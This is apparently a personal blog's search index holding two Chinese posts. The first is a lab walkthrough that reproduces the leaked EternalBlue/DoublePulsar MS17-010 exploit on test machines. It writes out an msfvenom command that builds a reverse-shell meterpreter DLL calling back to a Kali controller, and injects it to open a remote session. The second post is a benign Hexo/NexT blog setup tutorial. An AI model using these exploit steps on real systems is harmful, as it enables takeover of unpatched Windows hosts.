<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[NSA Enternalblue + Doublepulsar 复现 MS17-010]]></title>
      <url>/NSA%20Enternalblue%20+%20Doublepulsar%20%E5%A4%8D%E7%8E%B0%20MS17-010/</url>
      <content type="html"><![CDATA[<p>2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.py 是 fuzzbunch 的入口文件，通过该文件可以调用各攻击模块。</p>
<p>泄露的工具可在 Github 下载：<a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="external">https://github.com/misterch0c/shadowbroker</a></p>
<h3 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a><strong>0x01 影响范围</strong></h3><p>下图中列举了工具中相关模块所影响的服务和系统。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/92526918-file_1493343199647_16966.jpg" alt=""></p>
<h3 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a><strong>0x02 漏洞测试</strong></h3><p>下面使用工具中的 fuzzbunch 框架、Eternalblue 和 Doublepulsar 测试 Windows 下的 SMB 漏洞。首先通过 Eternalblue 利用 MS17-010 漏洞攻击 Windows 系统；然后在 Kali Linux 中用 Metasploit 生成一个能建立反向连接的 DLL，并在 Kali 中监听相应端口；最后使用 Doublepulsar 远程注入恶意 DLL 到目标系统，注入成功后 Kali 将与目标系统建立连接。</p>
<h4 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1. 测试环境"></a><strong>1. 测试环境</strong></h4><table>
<thead>
<tr>
<th style="text-align:left">PC</th>
<th style="text-align:left">IP</th>
<th>用途</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Win 7 x64</td>
<td style="text-align:left">192.168.109.1</td>
<td>攻击机</td>
<td>需安装 <a href="https://www.python.org/ftp/python/2.6.6/python-2.6.6.msi" target="_blank" rel="external">python2.6</a>  和 <a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download" target="_blank" rel="external">pywin32</a></td>
</tr>
<tr>
<td style="text-align:left">Win 7 x86</td>
<td style="text-align:left">192.168.109.132</td>
<td>靶机</td>
<td>开启 SMB 服务（445端口）</td>
</tr>
<tr>
<td style="text-align:left">Kali Linux</td>
<td style="text-align:left">192.168.109.128</td>
<td>控制端</td>
<td>生成payload 并控制回连会话</td>
</tr>
</tbody>
</table>
<p>首先需要把工具中的 windows 拷贝到攻击机 Win 7 x64中，然后在 windows 目录下新建一个 listeningposts 文件夹。</p>
<h4 id="2-测试流程"><a href="#2-测试流程" class="headerlink" title="2. 测试流程"></a><strong>2. 测试流程</strong></h4><h5 id="1）运行-fuzzbunch-框架"><a href="#1）运行-fuzzbunch-框架" class="headerlink" title="1）运行 fuzzbunch 框架"></a><strong>1）运行 fuzzbunch 框架</strong></h5><p>在 cmd 中进入 windows 目录，运行 <code>python fb.py</code>。输入目标系统 IP（Win 7 x86）和攻击机 IP（Win 7 x64），输入“no” 不重定向，接着输入项目名新建一个项目。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/95094523-file_1493344655277_8614.png" alt=""></p>
<h5 id="2）调用-Eternalblue-攻击系统"><a href="#2）调用-Eternalblue-攻击系统" class="headerlink" title="2）调用 Eternalblue 攻击系统"></a><strong>2）调用 Eternalblue 攻击系统</strong></h5><p>运行<code>use Eternalblue</code>，然后大多数步骤只需按回车使用默认参数即可。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/54184530-file_1493344922256_adf5.png" alt=""><br>下面需要选择 <code>1）FB</code> 模式。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/61786740-file_1493345114952_f2f3.png" alt=""><br>接着继续回车，直到成功运行攻击模块。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/73280707-file_1493345362094_157db.png" alt=""></p>
<h5 id="3）Metasploit-生成恶意-DLL"><a href="#3）Metasploit-生成恶意-DLL" class="headerlink" title="3）Metasploit 生成恶意 DLL"></a><strong>3）Metasploit 生成恶意 DLL</strong></h5><p>在 Kali Linux 下使用 Metasploit 生成恶意 DLL,它将在目标系统中建立一个反向连接。这里生成的 DLL必须要与目标系统版本一致，下面生成 32 bit 的 DLL。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.109.128 LPORT=6666 -f dll &gt; test.dll</div></pre></td></tr></table></figure></p>
<p>之后需要将生成的 test.dll 拷贝到攻击机的 D:\下。</p>
<h5 id="4）开启-msf-监听"><a href="#4）开启-msf-监听" class="headerlink" title="4）开启 msf 监听"></a><strong>4）开启 msf 监听</strong></h5><p>在 Kali Linux 下，运行 msf，监听 6666 端口。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/80220500-file_1493346556508_101d9.png" alt=""></p>
<h5 id="5）调用-Doublepulsar-注入-DLL"><a href="#5）调用-Doublepulsar-注入-DLL" class="headerlink" title="5）调用 Doublepulsar 注入 DLL"></a><strong>5）调用 Doublepulsar 注入 DLL</strong></h5><p>回到攻击机中，执行 <code>use Doublepulsar</code> ，回车使用默认参数直到选择 Function 为2 注入 DLL，然后指定 DLL 的路径。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/11038492-file_1493347262266_5c5.png" alt=""><br>注入成功后将返回如下信息。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/68357990-file_1493347997057_2e1f.png" alt=""><br>但是这里也会出现个问题，多次注入之后目标系统会出错重启。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/56721083-file_1493348716416_6f00.png" alt=""></p>
<h5 id="6）建立连接"><a href="#6）建立连接" class="headerlink" title="6）建立连接"></a><strong>6）建立连接</strong></h5><p>DLL 注入到目标系统之后，Kali Linux 将与目标系统建立连接。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/82624178-file_1493348105266_34db.png" alt=""></p>
<hr>
<p>References:<br>[1] NSA工具包之0day Eternalblue 复现笔记：<a href="http://blog.injectxx.com/2017/04/18/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0%E3%80%82/" target="_blank" rel="external">http://blog.injectxx.com/2017/04/18/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0%E3%80%82/</a><br>[2] HOW TO EXPLOIT ETERNALBLUE &amp; DOUBLEPULSAR TO GET AN<br>EMPIRE/METERPRETER SESSION ON WINDOWS 7/2008：<a href="https://www.exploit-db.com/docs/41896.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/41896.pdf</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Enternalblue </tag>
            
            <tag> Doublepulsar </tag>
            
            <tag> NSA </tag>
            
            <tag> SMB </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Github+Hexo+NexT搭建个人博客]]></title>
      <url>/Github+Hexo+NexT%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<p>平时在网上查文档的时候经常能看到一些非常好的博客，然后就想着自己也搭一个，一方面可以记录一些问题的解决方法，以便查阅，另一方面希望能促使自己多总结，多写文档。所以，经过这几天的折腾，终于把基本功能都搭好了。下面是搭建过程的记录，以下操作在 ubuntu14.04 x86_64中进行。</p>
<h3 id="0x01-安装Node-js"><a href="#0x01-安装Node-js" class="headerlink" title="0x01 安装Node.js"></a><strong>0x01 安装Node.js</strong></h3><h4 id="1）通过nvm安装Node-js"><a href="#1）通过nvm安装Node-js" class="headerlink" title="1）通过nvm安装Node.js"></a><strong>1）通过nvm安装Node.js</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | sh</div><div class="line">$ nvm ls-remote</div><div class="line">$ nvm install v7.9.0</div></pre></td></tr></table></figure>
<h4 id="2）测试"><a href="#2）测试" class="headerlink" title="2）测试"></a><strong>2）测试</strong></h4><p>安装完后可以新建一个简单的 hello.js 测试是否安装成功，hello.js 代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var http = require(&apos;http&apos;);</div><div class="line">http.createServer(function(req, res)&#123;</div><div class="line">    res.writeHead(200, &#123;&apos;Content-Type&apos;: &apos;text/plain&apos;&#125;);</div><div class="line">    res.end(&apos;Hello World\n&apos;);</div><div class="line">&#125;).listen(8808, &apos;127.0.0.1&apos;);</div><div class="line">console.log(&apos;Server running at http://127.0.0.1:8808&apos;);</div></pre></td></tr></table></figure></p>
<p>进入该文件所在目录，在终端输入<code>node hello_node.js</code>，然后用浏览器打开<code>http://127.0.0.1:8808</code> 即可看到 “Hello Word”。</p>
<h3 id="0x02-安装与配置Github"><a href="#0x02-安装与配置Github" class="headerlink" title="0x02 安装与配置Github"></a><strong>0x02 安装与配置Github</strong></h3><h4 id="1）安装Git"><a href="#1）安装Git" class="headerlink" title="1）安装Git"></a><strong>1）安装Git</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install git-core</div></pre></td></tr></table></figure>
<h4 id="2）配置ssh-keys"><a href="#2）配置ssh-keys" class="headerlink" title="2）配置ssh keys"></a><strong>2）配置ssh keys</strong></h4><p>首先检查现有的 ssh key：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cd ~/.ssh</div></pre></td></tr></table></figure></p>
<p>如果没有 key 则生成新的 ssh key：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ ssh-keygen -t rsa -C &quot;your email@163.com&quot;</div><div class="line">Generating public/private rsa key pair.</div><div class="line">Enter file in which to save the key (/home/xx/.ssh/id_rsa):</div></pre></td></tr></table></figure></p>
<p>按回车键后提示输入密码，该密码用于提交项目时的验证，可防止别人往你的项目里提交内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Enter passphrase (empty for no passphrase):</div><div class="line">Enter same passphrase again:</div></pre></td></tr></table></figure></p>
<p>成功生成 ssh key 之后可以看到以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ls</div><div class="line">id_rsa  id_rsa.pub  known_hosts</div></pre></td></tr></table></figure></p>
<p>在本地生成 ssh key 后需要添加到 Github 上，点击<code>Setting-&gt;SSH and GPG keys-&gt;New SSH key</code>，将 id_rsa.pub 中的内容复制到Key中。</p>
<h4 id="3）测试"><a href="#3）测试" class="headerlink" title="3）测试"></a><strong>3）测试</strong></h4><p>配置好后可以测试一下，执行 <code>$ ssh -T git@github.com</code>，若返回以下内容则配置成功！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hi xx! You&apos;ve successfully authenticated, but GitHub does not provide shell access.</div></pre></td></tr></table></figure></p>
<h4 id="4）设置用户信息"><a href="#4）设置用户信息" class="headerlink" title="4）设置用户信息"></a><strong>4）设置用户信息</strong></h4><p>Git 会根据用户的名字和邮箱来记录提交。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ git config --global user.name &quot;your name&quot;</div><div class="line">$ git config --global user.email &quot;your email on github&quot;</div></pre></td></tr></table></figure></p>
<h3 id="0x03-安装与配置Hexo"><a href="#0x03-安装与配置Hexo" class="headerlink" title="0x03 安装与配置Hexo"></a><strong>0x03 安装与配置Hexo</strong></h3><h4 id="1）安装-Hexo"><a href="#1）安装-Hexo" class="headerlink" title="1）安装 Hexo"></a><strong>1）安装 Hexo</strong></h4><p>进入需建立博客的目录，输入以下命令安装Hexo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-cli -g</div></pre></td></tr></table></figure></p>
<p>以后可以使用<code>$ nmp update hexo –g</code>命令更新Hexo。</p>
<h4 id="2）初始化"><a href="#2）初始化" class="headerlink" title="2）初始化"></a><strong>2）初始化</strong></h4><p>安装 Hexo 完成后，在当前博客目录下列命令，Hexo 将会在指定文件夹中新建所需要的文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ hexo init &lt;folder&gt;</div><div class="line">$ cd &lt;folder&gt;</div><div class="line">$ npm install</div></pre></td></tr></table></figure></p>
<p>初始化完成后，指定文件夹的目录如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── _config.yml	// 网站的 配置信息，可以在此配置大部分的参数</div><div class="line">├── package.json	// 应用程序的信息</div><div class="line">├── scaffolds	// 模版文件夹。新建文章时，Hexo 会根据 scaffold 来建立文件</div><div class="line">├── source		// 资源文件夹是存放用户资源的地方</div><div class="line">|   ├── _drafts</div><div class="line">|   └── _posts</div><div class="line">└── themes	// 主题 文件夹。Hexo 会根据主题来生成静态页面</div></pre></td></tr></table></figure></p>
<h4 id="3）测试-1"><a href="#3）测试-1" class="headerlink" title="3）测试"></a><strong>3）测试</strong></h4><p>配置好后启动服务器，在浏览器中访问<code>http://localhost:4000/</code>可以看到一篇默认文章。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div><div class="line">INFO  Start processing</div><div class="line">INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.</div></pre></td></tr></table></figure></p>
<h3 id="0x04-部署到Github"><a href="#0x04-部署到Github" class="headerlink" title="0x04 部署到Github"></a><strong>0x04 部署到Github</strong></h3><h4 id="1）创建github仓库"><a href="#1）创建github仓库" class="headerlink" title="1）创建github仓库"></a><strong>1）创建github仓库</strong></h4><p>点击右上角“+”-&gt; new repository，输入Repository name 为<code>yourname.github.io</code>，yourname 必须与 git 用户名一致，并且这将会是 blog 的域名。</p>
<h4 id="2）修改配置文件"><a href="#2）修改配置文件" class="headerlink" title="2）修改配置文件"></a><strong>2）修改配置文件</strong></h4><p>修改_config.yml文件中的参数，将Hexo与github上的仓库关联。修改如下，注意冒号后面有一个空格：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># Deployment</div><div class="line">## Docs: https://hexo.io/docs/deployment.html</div><div class="line">deploy:</div><div class="line">  type: git</div><div class="line">  repo: https://github.com/yourname/yourname.github.io</div><div class="line">  branch: master</div><div class="line">  message:</div></pre></td></tr></table></figure></p>
<p>参数描述：</p>
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">repo</td>
<td style="text-align:left">库（Repository）地址</td>
</tr>
<tr>
<td style="text-align:left">branch</td>
<td style="text-align:left">分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</td>
</tr>
<tr>
<td style="text-align:left">message</td>
<td style="text-align:left">自定义提交信息 ( 默认为 Site updated:now(‘YYYY-MM-DD HH:mm:ss’))</td>
</tr>
</tbody>
</table>
<h4 id="3）安装-hexo-deployer-git"><a href="#3）安装-hexo-deployer-git" class="headerlink" title="3）安装 hexo-deployer-git"></a><strong>3）安装 hexo-deployer-git</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>
<h4 id="4）部署到github"><a href="#4）部署到github" class="headerlink" title="4）部署到github"></a><strong>4）部署到github</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div><div class="line">INFO  Start processing</div><div class="line">...</div><div class="line">INFO  Deploy done: git</div></pre></td></tr></table></figure>
<p>成功后就可以通过浏览器访问<code>https://yourname.github.io/</code>。</p>
<h3 id="0x05-使用NexT主题"><a href="#0x05-使用NexT主题" class="headerlink" title="0x05 使用NexT主题"></a><strong>0x05 使用NexT主题</strong></h3><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 themes 目录下， 然后修改下配置文件即可。</p>
<h4 id="1）下载主题"><a href="#1）下载主题" class="headerlink" title="1）下载主题"></a><strong>1）下载主题</strong></h4><p>下载完后复制到themes目录下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/iissnan/hexo-theme-next.git</div></pre></td></tr></table></figure></p>
<h4 id="2）修改配置文件-1"><a href="#2）修改配置文件-1" class="headerlink" title="2）修改配置文件"></a><strong>2）修改配置文件</strong></h4><p>打开 Blog 目录下站点配置文件 _config.yml，将 theme 修改给主题文件夹名称。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Extensions</div><div class="line">## Plugins: https://hexo.io/plugins/</div><div class="line">## Themes: https://hexo.io/themes/</div><div class="line">theme: next</div></pre></td></tr></table></figure></p>
<h4 id="3）测试-2"><a href="#3）测试-2" class="headerlink" title="3）测试"></a><strong>3）测试</strong></h4><p>执行 <code>$ hexo s --debug</code> 验证主题是否启用，在浏览器中访问<code>http://localhost:4000</code>，查看效果。</p>
<h3 id="0x06主题优化"><a href="#0x06主题优化" class="headerlink" title="0x06主题优化"></a><strong>0x06主题优化</strong></h3><p>主题目录下同样有一个配置文件 _config.yml，可以修改相关参数对主题做修改。</p>
<h4 id="选择外观"><a href="#选择外观" class="headerlink" title="选择外观"></a><strong>选择外观</strong></h4><p>找到 Scheme 可以选择不同的外观。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Schemes</div><div class="line">#scheme: Muse</div><div class="line">scheme: Mist</div><div class="line">#scheme: Pisces</div></pre></td></tr></table></figure></p>
<h4 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a><strong>设置语言</strong></h4><p>打开站点配置文件，修改 language 字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">language: en</div></pre></td></tr></table></figure></p>
<h4 id="设置头像"><a href="#设置头像" class="headerlink" title="设置头像"></a><strong>设置头像</strong></h4><p>将头像放置主题目录下的 <code>source/uploads/</code>，修改 avatar 字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">avatar: /uploads/avatar.jpg</div></pre></td></tr></table></figure></p>
<h4 id="设置RSS"><a href="#设置RSS" class="headerlink" title="设置RSS"></a><strong>设置RSS</strong></h4><p>1）安装插件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-generator-feed</div></pre></td></tr></table></figure></p>
<p>2）设置站点配置文件，添加以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># Plugins</div><div class="line">## RSS</div><div class="line">feed:</div><div class="line">  type: atom	#feed type: atom or rss2</div><div class="line">  path: atom.xml	#feed path</div><div class="line">  limit: 20</div><div class="line">  hub:</div><div class="line">  content:</div></pre></td></tr></table></figure></p>
<h4 id="添加标签-tags-页面"><a href="#添加标签-tags-页面" class="headerlink" title="添加标签[tags]页面"></a><strong>添加标签[tags]页面</strong></h4><p>1）首先，执行<code>$ hexo new page tags</code> 新建tags 页面，然后修改刚新建的页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: tags</div><div class="line">date: 2017-04-19 21:18:05</div><div class="line">type: &quot;tags&quot;</div><div class="line">comments: false</div><div class="line">---</div></pre></td></tr></table></figure></p>
<p>2）编辑文章时，通过以下方式设置文章标签：<br><code>tages: [标签1,标签2,...标签n]</code></p>
<h4 id="添加分类-categories-页面"><a href="#添加分类-categories-页面" class="headerlink" title="添加分类[categories]页面"></a><strong>添加分类[categories]页面</strong></h4><p>执行<code>$ hexo new page tags</code> 新建一个页面，然后修改刚新建的页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: categories</div><div class="line">date: 2017-04-19 21:25:38</div><div class="line">type: &quot;catgories&quot;</div><div class="line">comments: false</div><div class="line">---</div></pre></td></tr></table></figure></p>
<h4 id="设置分类"><a href="#设置分类" class="headerlink" title="设置分类"></a><strong>设置分类</strong></h4><p>修改站点配置文件中category_map 字段设置分类名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># Category &amp; Tag</div><div class="line">default_category: uncategorized</div><div class="line">category_map:</div><div class="line">  Category1:</div><div class="line">  Category2:</div><div class="line">  Category3:</div><div class="line">tag_map:</div></pre></td></tr></table></figure></p>
<h4 id="设置代码高亮"><a href="#设置代码高亮" class="headerlink" title="设置代码高亮"></a><strong>设置代码高亮</strong></h4><p>修改站点配置文件中 highlight_theme 字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">highlight_theme: night bright</div></pre></td></tr></table></figure></p>
<h4 id="修改文章内链样式"><a href="#修改文章内链样式" class="headerlink" title="修改文章内链样式"></a><strong>修改文章内链样式</strong></h4><p>将内链设置为蓝色，鼠标选中时显示下划线。在 <code>themes/next/source/css/_custom/custom.styl</code> 中添加如下样式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.post-body p a &#123;</div><div class="line">  color: #0593d3;</div><div class="line">  border-bottom: none;</div><div class="line">  &amp;:hover &#123;</div><div class="line">    color: #0477ab;</div><div class="line">    text-decoration: underline;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="图片居中"><a href="#图片居中" class="headerlink" title="图片居中"></a><strong>图片居中</strong></h4><p>修改<code>/themes/next/source/css/_schemes/Mist/</code>目录下的 _posts-expanded.styl。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.post-body img &#123; margin: 0 ; &#125;</div><div class="line">改为</div><div class="line">.post-body img &#123; margin: 0 auto; &#125;</div></pre></td></tr></table></figure></p>
<h4 id="设置站点logo"><a href="#设置站点logo" class="headerlink" title="设置站点logo"></a><strong>设置站点logo</strong></h4><p>通过网站 favicon 在线制作制作 favicon 图片，把图片放在<code>/themes/next/source/image</code> 目录中，然后修改主题配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">favicon: images/favicon.ico</div></pre></td></tr></table></figure></p>
<h4 id="首页文章摘要"><a href="#首页文章摘要" class="headerlink" title="首页文章摘要"></a><strong>首页文章摘要</strong></h4><p>在首页只显示文章部分摘要，点击 “Read more” 查看全文。修改主题配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">auto_excerpt:</div><div class="line">  enable: true</div><div class="line">  length: 150</div></pre></td></tr></table></figure></p>
<h4 id="更改内容区域的宽度"><a href="#更改内容区域的宽度" class="headerlink" title="更改内容区域的宽度"></a><strong>更改内容区域的宽度</strong></h4><p>编辑主题的 <code>source/css/_variables/custom.styl</code> 文件，新增变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// change width when width of screen &lt; 1600px</div><div class="line">$content-desktop = 800px</div><div class="line">// change width when width of screen &gt;= 1600px</div><div class="line">$content-desktop-large = 1000px</div></pre></td></tr></table></figure></p>
<h4 id="访客量与阅读量统计"><a href="#访客量与阅读量统计" class="headerlink" title="访客量与阅读量统计"></a><strong>访客量与阅读量统计</strong></h4><p>使用不蒜子统计，修改主题配置文件的 busuanzi_count 的配置项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">busuanzi_count:</div><div class="line">  # count values only if the other configs are false</div><div class="line">  enable: true</div><div class="line">  # custom uv span for the whole site</div><div class="line">  site_uv: true</div><div class="line">  site_uv_header: 访客数</div><div class="line">  site_uv_footer: 人次</div><div class="line">  # custom pv span for the whole site</div><div class="line">  site_pv: true</div><div class="line">  site_pv_header: 总访问量</div><div class="line">  site_pv_footer: 次</div><div class="line">  # custom pv span for one page only</div><div class="line">  page_pv: true</div><div class="line">  page_pv_header: 阅读次数</div><div class="line">  page_pv_footer:</div></pre></td></tr></table></figure></p>
<h4 id="添加本地搜索"><a href="#添加本地搜索" class="headerlink" title="添加本地搜索"></a><strong>添加本地搜索</strong></h4><p>使用NexT主题内置的本地站内搜索，执行 <code>$ npm install hexo-generator-search --save</code> 安装插件，然后在站点配置文件中，添加以下内容到任意位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">path: search.xml</div><div class="line">field: post</div><div class="line">format: html</div><div class="line">limit: 10000</div></pre></td></tr></table></figure></p>
<p>编辑主题配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># Local search</div><div class="line">local_search:</div><div class="line">  enable: true</div></pre></td></tr></table></figure></p>
<h4 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a><strong>添加评论功能</strong></h4><p>next 主题支持 Disqus，Hypercomments，网易云跟贴等多种第三方评论系统，这里采用网易云跟帖。<br>1）首先，登录网易云跟帖，填写站点信息，其中，站点网站为 blog 地址，要求必须为独立域名，github.io 无法收录。<br>2）然后点击获取代码，进行皮肤和功能的设置。<br>3）最后点击 APP SDK 获取 KEY。修改blog主题配置文件，将key填入相应字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># Gentie productKey</div><div class="line">gentie_productKey: xxxxxxxxxxxxxxxxxxxxxxxxxxx</div></pre></td></tr></table></figure></p>
<p>4）重新部署 blog 即可生效。</p>
<h3 id="0x07-域名绑定"><a href="#0x07-域名绑定" class="headerlink" title="0x07 域名绑定"></a><strong>0x07 域名绑定</strong></h3><h4 id="1）购买域名"><a href="#1）购买域名" class="headerlink" title="1）购买域名"></a><strong>1）购买域名</strong></h4><p>首先需要购买一个域名，我是在腾讯云买的，支付后要进行实名认证才能正常使用。</p>
<h4 id="2）创建-CNAME"><a href="#2）创建-CNAME" class="headerlink" title="2）创建 CNAME"></a><strong>2）创建 CNAME</strong></h4><p>在 blog 目录下的 source 文件夹中新建文件 CNAME，并将域名写入该文件。之后重新部署blog。</p>
<h4 id="3）配置域名解析"><a href="#3）配置域名解析" class="headerlink" title="3）配置域名解析"></a><strong>3）配置域名解析</strong></h4><p>添加以下3条记录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@          A             192.30.252.153</div><div class="line">@          A             192.30.252.154</div><div class="line">www      CNAME           username.github.io</div></pre></td></tr></table></figure></p>
<p>设置好后可能需要等一段时间才能生效。</p>
